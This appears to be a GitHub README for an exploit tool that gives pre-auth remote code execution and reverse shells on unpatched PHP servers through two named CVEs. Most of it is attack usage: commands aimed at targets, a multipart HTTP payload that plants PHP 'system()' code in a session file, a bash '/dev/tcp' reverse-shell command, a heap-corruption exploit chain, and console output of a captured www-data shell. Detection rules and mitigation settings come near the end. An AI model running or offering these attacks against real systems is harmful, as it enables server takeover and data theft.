# Php2Shell-POC

> Pre-auth remote code execution & reverse shell for **CVE-2026-109618** /
> **CVE-2026-109619** — the two critical PHP core vulnerabilities patched in
> PHP 8.5.12 / 8.4.27 / 8.3.36 / 8.2.35.

[![Php2Shell-POC](https://img.shields.io/badge/repo-php2shell--poc-34a853?style=for-the-badge&logo=github)](https://github.com/Whackermelon/Php2Shell-POC)
[![Stars](https://img.shields.io/github/stars/Whackermelon/Php2Shell-POC?style=social)](https://github.com/Whackermelon/Php2Shell-POC/stargazers)
[![Forks](https://img.shields.io/github/forks/Whackermelon/Php2Shell-POC?style=social)](https://github.com/Whackermelon/Php2Shell-POC/network/members)
[![Issues](https://img.shields.io/github/issues/Whackermelon/Php2Shell-POC?style=social)](https://github.com/Whackermelon/Php2Shell-POC/issues)
[![Last commit](https://img.shields.io/github/last-commit/Whackermelon/Php2Shell-POC?style=flat-square&color=blue)](https://github.com/Whackermelon/Php2Shell-POC/commits/main)
[![Pages](https://img.shields.io/badge/docs-whackermelon.github.io%2FPhp2Shell--POC-blue?style=flat-square)](https://whackermelon.github.io/Php2Shell-POC/)
[![CVE-2026-109618](https://img.shields.io/badge/CVE-2026-109618-critical-red?style=flat-square)](https://github.com/Whackermelon/Php2Shell-POC/security/advisories)
[![CVE-2026-109619](https://img.shields.io/badge/CVE-2026-109619-critical-red?style=flat-square)](https://github.com/Whackermelon/Php2Shell-POC/security/advisories)
[![CVSS v4.0](https://img.shields.io/badge/CVSS%20v4.0-9.2%20critical-critical?style=flat-square)](https://nvd.nist.gov/vuln/detail/CVE-2026-109618)
[![License: MIT](https://img.shields.io/badge/license-MIT-green?style=flat-square)](LICENSE)
[![Python](https://img.shields.io/badge/python-3.8%2B-blue?style=flat-square&logo=python&logoColor=white)](https://www.python.org/)
[![Dependencies](https://img.shields.io/badge/dependencies-none-success?style=flat-square)](#requirements)
[![No account needed](https://img.shields.io/badge/auth-unauthenticated-success?style=flat-square)](#)
[![Platform](https://img.shields.io/badge/platform-Linux%20%7C%20Windows%20%7C%20macOS-lightgrey?style=flat-square)](#requirements)

<p align="center">
  <img src=".github/assets/social-preview.png" alt="php2shell — CVE-2026-109618 / CVE-2026-109619" width="100%">
</p>

<p align="center">
  <b>One URL in, a reverse shell out.</b><br>
  <code>nc -lvnp 4444</code> in one terminal, <code>python3 php2shell.py &lt;URL&gt; -l &lt;LHOST&gt; -p 4444</code> in the other.
</p>

<p align="center">
  <b>Two independent bugs, two PoCs.</b><br>
  <code>php2shell.py</code> drives <b>CVE-2026-109619</b> (session upload-progress).<br>
  <code>php2shell_raw.py</code> drives <b>CVE-2026-109618</b> (heap corruption / ASLR bypass).
</p>

<p align="center">
  <a href="https://whackermelon.com/projets/php2shell-poc/">✍️ Read the full write-up</a>
  &nbsp;·&nbsp;
  <a href="https://whackermelon.github.io/Php2Shell-POC/">🌐 Landing page</a>
  &nbsp;·&nbsp;
  <a href="https://github.com/openai/php2shell-checker">🩺 Check if a target is vulnerable</a>
  &nbsp;·&nbsp;
  <a href="https://github.com/Whackermelon/Php2Shell-POC/issues">🐛 Report an issue</a>
  &nbsp;·&nbsp;
  <a href="https://github.com/Whackermelon/Php2Shell-POC/discussions">💬 Discussions</a>
  &nbsp;·&nbsp;
  <a href="https://github.com/Whackermelon">👤 Whackermelon</a>
</p>

---

## 📖 Table of contents

- [What it does](#-what-it-does)
- [Quick start](#-quick-start)
- [The vulnerabilities](#-the-vulnerabilities)
- [How it works](#-how-it-works)
- [Strategies](#-strategies)
- [The rawkey PoC (CVE-2026-109618)](#-the-rawkey-poc-cve-2026-109618)
- [Command-line options](#-command-line-options)
- [Examples](#-examples)
- [Requirements](#-requirements)
- [Checking a target first](#-checking-a-target-first)
- [Troubleshooting](#-troubleshooting)
- [Detection](#-detection)
- [Mitigation](#-mitigation)
- [Credits](#-credits)
- [Find it](#-find-it)
- [Terminal banner](#-terminal-banner)

---

## 💥 What it does

`php2shell.py` takes **one URL** and gives you **remote code execution** on
the target — a reverse shell, or the output of any command you like. It
speaks plain HTTP(S) only, needs **no account**, **no target-side helper
file**, and **no third-party Python dependency**.

| | |
|---|---|
| **CVE-2026-109618** | RCE via OOM corruption |
| **CVE-2026-109619** | RCE via stale global state |
| **CVSS v4.0** | 9.2 — Critical |
| **Affected** | PHP 5.4 → 8.5.x (8.1 and older are EOL and never patched) |
| **Fixed in** | PHP 8.5.12 · 8.4.27 · 8.3.36 · 8.2.35 |
| **Auth** | none — pre-authenticated |
| **Requirements** | Python 3.8+, standard library only |

---

## 🚀 Quick start

```bash
git clone https://github.com/Whackermelon/Php2Shell-POC.git
cd Php2Shell-POC
chmod +x php2shell.py
```

**Reverse shell**

```bash
# terminal 1
nc -lvnp 4444

# terminal 2
python3 php2shell.py https://target.example.com/index.php -l 10.0.0.5 -p 4444
```

**One-shot command**

```bash
python3 php2shell.py https://target.example.com/index.php -c 'id'
```

The PoC prints exactly what it did, and says clearly when a target cannot
be exploited (no PHP endpoint, no session fixation, or no inclusion sink).

---

## 🧬 The vulnerabilities

The two CVEs shipped in the same emergency release but they are **two
independent bug families with different attack surfaces**. Each one has its
own PoC in this repository.

| | **CVE-2026-109619** — *php2shell* | **CVE-2026-109618** — *rawkey* |
|---|---|---|
| PoC | `php2shell.py` | `php2shell_raw.py` |
| Surface | `session.upload_progress` callback, `ext/session/session.c` | Zend Engine `HashTable`, during `$_POST` parsing |
| Trigger | multipart POST, ~450 bytes | urlencoded POST, one oversized field name (> 1 MB) |
| Primitive | attacker writes PHP into their own session file, then an `include()` sink runs it | out-of-memory bailout leaves a dangling pointer, reused as a fake `HashTable` whose `pDestructor` is `zif_system` |
| Needs | a PHP session **on disk** and an inclusion sink | `display_errors=1`, a small `memory_limit`, single-worker prefork |
| WAF signature | a `PHPSESSID` form field | a field name >= 1000 bytes |
| Mitigation | `session.upload_progress.enabled = 0` | `memory_limit = -1` |

### CVE-2026-109619 — *php2shell* (session upload-progress)

From the official PHP security advisory:

> **CVE-2026-109619** — RCE via stale global state. Request-owned internal
> state can survive after its backing memory has been freed. A later request
> handled by the same worker may use that stale state before normal
> initialisation resets it.

The reachable surface is the **session upload-progress handler** in
`ext/session/session.c`, which has three independent problems:

1. **Session fixation (pre-auth).** `MULTIPART_EVENT_FORMDATA` copies the
   POST-body field whose name is PHP's `session.name` into the progress
   session id, **ignoring `session.use_only_cookies`**. The attacker
   therefore picks the session id — and hence the on-disk session file name.
2. **Unvalidated file name.** `MULTIPART_EVENT_FILE_START` stores the
   *raw* uploaded file name into the session data, with no sanitisation.
3. **Attacker-controlled session content.** The POST-body field named
   `PHP_SESSION_UPLOAD_PROGRESS` becomes the session key
   `upload_progress_<value>`, stored **verbatim**.

Because the progress data is serialised into the attacker's *own* session
file, and PHP's session serialiser is not a sandbox, the attacker fully
controls the **content** of a file whose name is **fully predictable**:

```
<session.save_path>/sess_<chosen session id>
```

> **Note.** This chain needs the session to be **stored on disk**. When
> `session.save_handler` is `redis` (or any other non-`files` handler), there
> is no session file to poison and the chain cannot work — that is a
> configuration check, not a limitation of the PoC.

### CVE-2026-109618 — *rawkey* (heap corruption)

From the official PHP security advisory:

> **CVE-2026-109618** — RCE via OOM corruption. An out-of-memory
> condition can interrupt PHP while internal request data is only partially
> initialised. Request cleanup may then treat the invalid data as valid.

This one does **not** touch `session.upload_progress`. An oversized
urlencoded field name exhausts the request allocator while `$_POST` is being
parsed, the bailout leaves a dangling `PS(http_session_vars)` in the worker,
and the next request that initialises the session walks that freed memory.
A forged `HashTable` is then read back with `pDestructor` pointing at
`zif_system`, so the command runs inside libphp and libc is never needed.

`php2shell_raw.py` implements the whole chain: worker rotation, the heap
leak that yields the Zend MM chunk base, the second leak that yields the
libphp base, then the fake `HashTable` that executes the command. See
[🧬 The rawkey PoC](#-the-rawkey-poc-cve-2026-109618) below.

---

## 🧠 How it works

### Step 1 — pre-auth session fixation

```http
POST /index.php HTTP/1.1
Content-Type: multipart/form-data; boundary=X

--X
Content-Disposition: form-data; name="PHPSESSID"

attackerchosenid
--X
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"

<?php system(base64_decode("...")); ?>
--X
Content-Disposition: form-data; name="f"; filename="a.txt"

ZZZZ
--X--
```

The session id is now known, so the session file path is known too.

### Step 2 — writing attacker content into the session file

The `PHP_SESSION_UPLOAD_PROGRESS` value becomes the session key
`upload_progress_<value>`, and the session serialiser writes it verbatim.
On disk, with the `php` handler:

```
upload_progress_<?php system(base64_decode("YmFzaCAtYyAn...")); ?>|a:5:{s:10:"start_time";i:...}
```

The payload is base64 encoded, so it can carry **any** command without
tripping the session serialiser's `|` and newline restrictions.

### Step 3 — triggering execution

If the application includes the session file (an `include()`/`require()`
sink), the embedded `<?php ... ?>` block runs and the command's output
comes back inside the HTTP response.

The PoC auto-detects this by poisoning a session with a harmless marker
and looking for the marker in the response, trying the common parameter
names (`page`, `file`, `path`, `doc`, `include`, `view`, `lang`, …) against
the common save paths (`/tmp`, `/var/lib/php/sessions`, …).

---

## 🎯 Strategies

### Strategy 1 — session file poisoning + inclusion sink

The most general approach: works against any target with an
`include()`/`require()` sink that can be pointed at a session file, and
needs **no knowledge of the target's PHP build**.

Needs:

- `session.upload_progress.enabled = On` (PHP default)
- `session.upload_progress.cleanup = Off` — so the poisoned entry is not
  deleted at the end of the upload (**PHP's default is `On`**, so this has
  to be changed server-side)
- an `include()`/`require()` sink reachable with a user-controlled path

### Strategy 2 — serialiser handler mismatch → object injection

If two directories use different `session.serialize_handler` values, a
session written as `php_serialize` and read back with the `php` handler is
re-parsed as a `key|value` stream. A file name containing `|` shifts the
parse so that attacker bytes get deserialised as a serialized object, whose
`__destruct` runs during cleanup — **even though the decode returns
FAILURE**, because `__destruct` fires on both the success and the failure
path of `var_destroy()`.

Needs:

- two reachable directories with different `session.serialize_handler`
- a class with a useful `__destruct` that is autoloadable on the target

---

## 🧬 The rawkey PoC (CVE-2026-109618)

`php2shell_raw.py` is a **second, independent** PoC. It does not use
`session.upload_progress`, does not need an inclusion sink, does not need
a session on disk, and does not need `session_start()` on the target page:
the whole chain is plain HTTP against any PHP endpoint.

```bash
# one command: worker rotation, both leaks, then the command execution
python3 php2shell_raw.py -u http://127.0.0.1:8099/index.php \
    --libphp /path/to/libphp.so -c 'id' --proof-file /tmp/proof
```

```
[*] target http://127.0.0.1:8099/index.php  (cmd='id')
[*] offsets: zif=0x43a870 dtor=0x613c50 htdata=0x6e0d8 huge=12M
[*] stage 1/3 heap leak
[+] Zend MM chunk base = 0x7f4498a00000
[*] stage 2/3 libphp leak
[+] libphp base = 0x7f4498900000
[*] stage 3/3 execution  HTDATA=0x7f44990e0d8  ZIF=0x7f4498d3a870
[+] stage 3 attempt 1 confirmed
PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### How it works

| Stage | What happens |
|---|---|
| 0 — worker rotation | A request whose last field is 12 MB OOMs inside `php_session_initialize()`. The Apache child dies with `SIGABRT`; prefork forks a fresh child that **inherits the same libphp and Zend MM chunk mappings**. |
| 1 — heap leak | A uses 1001 fields to trip the `max_input_vars` warning (`display_errors=On` ⇒ `headers_sent=1`) and a `PHPSESSID` field of `\x00` to make PHP mint a new session id with `send_cookie=1`. The oversized field then OOMs, leaving `PS(http_session_vars)` and `PS(id)` **dangling**. B re-allocates the freed reference with a 56-byte multipart value and carries a forged 192-byte `zend_string`; the out-of-bounds read in `php_url_encode()` spills **Zend MM chunk pointers into `Set-Cookie`** (4096 bytes, 98 pointers). |
| 2 — libphp leak | A parks the dangling `PS(id)` at `chunk+0xb7400`. B's 56-byte HashTable page makes `ZSTR_LEN(PS(id))` read `nTableSize=16`, so the data area starts exactly on `nNextFreeElement\|pDestructor` — and `pDestructor == ZVAL_PTR_DTOR` gives the **libphp base**. |
| 3 — execution | A pins the dangling reference at `R0 = chunk+0x24e0` with six padding fields. B overwrites `R0-0x10` with a 55-byte raw buffer holding a fake `zend_reference` whose value is a fake `HashTable` stored in a live 167-byte string, with `pDestructor = zif_system`. The next request that initialises the session walks the corrupted heap: `zval_ptr_dtor(PS(http_session_vars))` → `zend_reference_destroy(R0)` → `zend_array_destroy(fake HT)` → `zend_hash_destroy(fake HT)` → `pDestructor(&bucket->val)` → **`zif_system`**. |

Only `zif_system` is used, so **libc never enters the picture** and the
command runs with the web server's own privileges.

### Requirements on the target

| Setting | Value | Why |
|---|---|---|
| `display_errors` | `On` | the OOM path and the out-of-bounds read must reach the response |
| `memory_limit` | small (8 MB in the lab) | the oversized field name has to exhaust it |
| `post_max_size` | > the field size | the body must be parsed at all |
| `max_input_vars` | `1000` | the 1001st field is what trips the warning |
| `session.use_cookies` | `On` | |
| `session.use_strict_mode` | `0` | |
| `session.upload_progress.enabled` | `On` | |
| Apache | prefork, **one worker** | the corrupted heap must survive in the forked child |

The official mitigations for this family are `memory_limit = -1` and, on
PHP 8.5, `fatal_error_backtraces = 0`.

### Offsets are build-specific

`zif_system` and `ZVAL_PTR_DTOR` are read from the target's own
`libphp.so`:

```bash
python3 php2shell_raw.py -u http://target/index.php --libphp ./libphp.so ...
```

If the library is **stripped**, `zif_system` is a local symbol and cannot be
read: pass the offsets explicitly (`--zif-offset`, `--dtor-offset`) or
sweep for them (`--sweep-zif 0x251000:0x252000:0x10`). The
chunk-relative offset (`--htdata-offset`) depends on the exact PHP build
and the request shape; the reference value is the one of the lab below.

### 🧪 The lab

A reproducible target ships in [`lab/`](lab/):

```bash
cd lab
docker compose up -d
python3 ../php2shell_raw.py -u http://127.0.0.1:8099/index.php \
    --libphp /usr/lib/apache2/modules/libphp.so \
    -c 'id>/out/proof' --proof-file out/proof
```

`lab/php.ini` and `lab/apache.conf` hold the exact configuration above
(single prefork worker, `memory_limit=8M`, `display_errors=On`).

> The offsets of a *different* PHP build differ; read them from that
> build's `libphp.so` rather than reusing the numbers above.

---

## ⚙️ Command-line options

```
python3 php2shell.py URL [options]

  -l, --lhost        reverse shell listener address
  -p, --lport        reverse shell listener port (default 4444)
  -c, --cmd          command to execute instead of a reverse shell
  --sid              session id to use (default: random)
  --session-name     PHP session name (default: auto-detected, usually
                     PHPSESSID)
  --fix-by           how the chosen session id is sent: "body" (the CVE
                     route, default) or "cookie" (the early_find_sid route)
  --save-path        server-side session save path
  --sink             inclusion sink URL, e.g. '/index.php?page=<SESSIONFILE>'
  --write-path       php_serialize directory (strategy 2)
  --read-path        php directory (strategy 2)
  --gadget           serialized object injected by strategy 2
  --all              try every strategy (default behaviour)
  --no-banner        do not print the watermelon banner
  --timeout          per-request timeout in seconds (default 30)
  -v, --verbose      verbose output
```

---

## 🧪 Examples

### Reverse shell, everything auto-detected

```console
$ python3 php2shell.py http://127.0.0.1:8088/sink.php -l 127.0.0.1 -p 4444 -v

  php2shell  -  CVE-2026-109618 / CVE-2026-109619  (pre-auth RCE)

[*] target   : http://127.0.0.1:8088/sink.php
[*] session  : u9bavj3i070qhddg8vfptmhluj
[*] command  : bash -c 'exec bash -i >& /dev/tcp/127.0.0.1/4444 0>&1' </dev/null >/dev/null 2>&1 &
[*] listener : 127.0.0.1:4444
[*] probe /sink.php            -> HTTP 200  PHP/8.4.24         Apache/2.4.68 (Debian) PHP/8.4.24  [PHP]
[*] checking pre-auth session fixation ...
[+] session fixation accepted by the target
[*] no --sink given, probing for an include() sink ...
[+] found sink: /sink.php?page=<SESSIONFILE>  (session file /tmp/sess_u9bavj3i070qhddg8vfptmhluj)
[*] poisoned session (attempt 1, session name PHPSESSID, id via POST body) HTTP 200
[*] trigger via /sink.php?page=/tmp/sess_u9bavj3i070qhddg8vfptmhluj -> HTTP 200 (712 bytes)

[+] payload delivered via: strategy1
[+] check your listener: nc -lvnp 4444
```

On the listener side:

```console
$ nc -lvnp 4444
bash: impossible de régler le groupe de processus du terminal: Ioctl() inapproprié
www-data@web:/var/www/html$
```

### Explicit sink and session path

```bash
python3 php2shell.py https://target/index.php -l 10.0.0.5 -p 4444 \
    --sink '/index.php?page=<SESSIONFILE>' --save-path /var/lib/php/sessions
```

### One-shot command

```bash
python3 php2shell.py https://target/index.php -c 'id'
```

### Serialiser handler mismatch (no LFI needed)

```bash
python3 php2shell.py https://target/app/upload.php \
    --write-path /app/upload.php --read-path /api/endpoint.php -c 'id'
```

### Target in maintenance mode

The PoC refuses to fire and says so, instead of failing silently:

```console
[*] probe /index.php           -> HTTP 500                     nginx
[*] probe /                   -> HTTP 200                     nginx
[!] no PHP endpoint found.
    Every candidate path either errored out (HTTP 5xx) or was
    served by the web server without ever reaching a PHP
    interpreter (no X-Powered-By, no PHP fingerprint).
```

---

## 📋 Requirements

**On the target**

- an unpatched PHP: **< 8.5.12 / 8.4.27 / 8.3.36 / 8.2.35**
- `session.upload_progress.enabled = On` (default)
- `session.upload_progress.cleanup = Off` (non-default — **required by
  strategy 1**)
- for strategy 2: two directories with different `session.serialize_handler`

**Locally**

- Python 3.8+ (standard library only)
- `nc` / `ncat` / `socat` for the listener

---

## 🔍 Troubleshooting

**`[!] no PHP endpoint found`**
Every candidate path returned HTTP 5xx or was served statically, and none
of them reached a PHP interpreter. The application is in **maintenance
mode** or behind a broken vhost — there is no session module to attack.
Retry when the site is back up.

**`HTTP 421 Misdirected Request`**
Some CDNs (Akamai, Cloudflare) reject a `Host` header that carries the
port when it is the scheme default. The PoC omits `:443` / `:80` in that
case; if you drive it with your own client, do the same.

**`no include() sink detected`**
Strategy 1 needs an `include()`/`require()` sink. Pass it explicitly:

```bash
python3 php2shell.py https://target/index.php -l 10.0.0.5 -p 4444 \
    --sink '/index.php?page=<SESSIONFILE>' --save-path /var/lib/php/sessions
```

**`the target did not echo the session id we sent`**
A warning, not an error: plenty of applications never resend their session
cookie, and the chain still works if the session *file* is created under
the id we chose. If the exploit does not fire, the session name is
probably not the one that was detected — pass it explicitly with
`--session-name`. The name is auto-detected from the cookies the target
sets, but a lot of applications rename the session, and some regenerate
the id (`session_regenerate_id`) or roll their own session layer — in the
latter two cases this chain cannot work on that target at all.

**The session id is ignored in the POST body but accepted in a cookie**
Some applications regenerate the id they are given in the body while
still honouring the one in the cookie. The upload-progress handler reaches
the session id by two routes, and the cookie one is the second:

```bash
python3 php2shell.py https://target/index.php -l 10.0.0.5 -p 4444 --fix-by cookie
```

**The payload is delivered but nothing happens**
`system()`, `exec()`, `passthru()`, `shell_exec()` and `proc_open()` are
frequently disabled with `disable_functions`. Check the target's
configuration; if the shell functions are gone, use another execution
primitive.

**Every multipart POST returns 403 / 406 / 429**
A WAF, an `.htaccess` rule or a rate limiter in front of the application.
A 406 in particular usually means a WAF is inspecting the request body.
Note that the upload-progress handler needs a **file part** to write the
payload, so a WAF that blocks file uploads blocks the whole chain.

---

## 🔔 Detection

Alert when a PHP worker process spawns a child it should never spawn:

- workers: `php-fpm`, `php-cgi`, `lsphp`, `httpd`, `apache2`
- children: `/bin/sh`, `/bin/bash`, `cmd.exe`, `powershell.exe`, `python`,
  `perl`, `curl`, `wget`, `nc`, `certutil.exe`
- command lines containing `/dev/tcp/`, `fsockopen`, `mkfifo`
- immediate reconnaissance: `whoami`, `id`, `uname -a`, `ipconfig`

Also:

- grep the web access logs for `PHP_SESSION_UPLOAD_PROGRESS`
- look for session files containing `upload_progress_` followed by `<?php`
  in `session.save_path`
- watch for new files in the web root, `/tmp`, `/var/tmp`, new cron jobs
  and new accounts

---

## 🛡️ Mitigation

Update PHP to **8.5.12 / 8.4.27 / 8.3.36 / 8.2.35**, or to your vendor's
backport. Until then, per the official advisory:

```ini
; CVE-2026-109619 - blocks the confirmed session paths.
; Set it before request parsing (php.ini, FPM pool or server config)
; and RESTART every worker.  ini_set() and .user.ini are not enough.
session.upload_progress.enabled = 0

; CVE-2026-109618 - removes the controllable memory-limit failure.
; Use php_admin_value in the FPM pool or the Apache configuration so
; the application cannot override it.
memory_limit = -1

; Keep the request small; lower it if the app does not need uploads.
post_max_size = 8M        ; 32M if file uploads are required
upload_max_filesize = 8M
```

Hardening (defence in depth, not a fix):

```ini
session.use_only_cookies = On
session.use_strict_mode = On
session.serialize_handler = php_serialize   ; consistently, everywhere
disable_functions = exec,passthru,shell_exec,system,proc_open,popen
```

---

## 👏 Credits

- The PHP security team, for the advisory and the patches
- [watchTowr — PHP CVE-2026-109618 FAQ](https://watchtowr.com/intelligence/php-cve-2026-109618-faq/)
- [sansec — PHP2Shell research](https://sansec.io/research/php2shell)
- [Hadrian — php2shell exploited in the wild](https://hadrian.io/vulnerability-alerts/php2shell-leaked-critical-php-rce-cve-2026-109618-cve-2026-109619)
- [CERT-EU advisory 2026-018](https://cert.europa.eu/publications/security-advisories/2026-018)
- [PHP session upload-progress internals](https://github.com/php/php-src/blob/PHP-8.4/ext/session/session.c)
- [PHP multipart parser](https://github.com/php/php-src/blob/PHP-8.4/main/rfc1867.c)
- The researchers who published their chains in the open, including
  `eness`, `9bie`, `ikow`, `iQingshan`, `dinosn` and `19h`

---

## 🩺 Checking a target first

Before running the PoC, check whether the target actually serves a
vulnerable PHP. The [OpenAI php2shell-checker](https://github.com/openai/php2shell-checker)
does exactly that:

```bash
npx phpcheck.js https://target.example.com
# or, against a local binary
npx phpcheck.js --local
```

| Result | Meaning |
|---|---|
| `VULNERABLE` | the PHP version is at or below the patched version of its branch — go on |
| `OK` | the PHP version is patched — this chain will not work |
| `UNKNOWN` | the version could not be determined (no `X-Powered-By`, no `php -v`) |

The checker only looks at the version, so it says nothing about the
`session.upload_progress` configuration: the PoC itself reports that part
(`session fixation accepted by the target`, `no include() sink detected`, …).

---

## 🔎 Find it

This project is listed under the GitHub topics
`cve-2026-109618`, `cve-2026-109619`, `php2shell`, `reverse-shell`,
`rce`, `exploit`, `poc`, `pre-auth`, `use-after-free`, `heap-uaf`,
`pentest` and `security-research`.

Search it on GitHub:

```
https://github.com/topics/cve-2026-109618
https://github.com/topics/cve-2026-109619
https://github.com/topics/php2shell
```

Report a problem, request a feature, or ask a question on the
[issue tracker](https://github.com/Whackermelon/Php2Shell-POC/issues) or in
[discussions](https://github.com/Whackermelon/Php2Shell-POC/discussions).

---

## 🖥️ Terminal banner

The PoC prints an ASCII banner on start-up, so it renders in any terminal,
and it stays a single self-contained file: no dependency, no build step,
nothing to install next to it.

---

## 📜 License

MIT — see [LICENSE](LICENSE).

## ⚠️ Disclaimer

For **authorised security testing and education only**. Use only against
systems you own or have explicit written permission to test. The authors
accept no liability for any misuse of this tool.
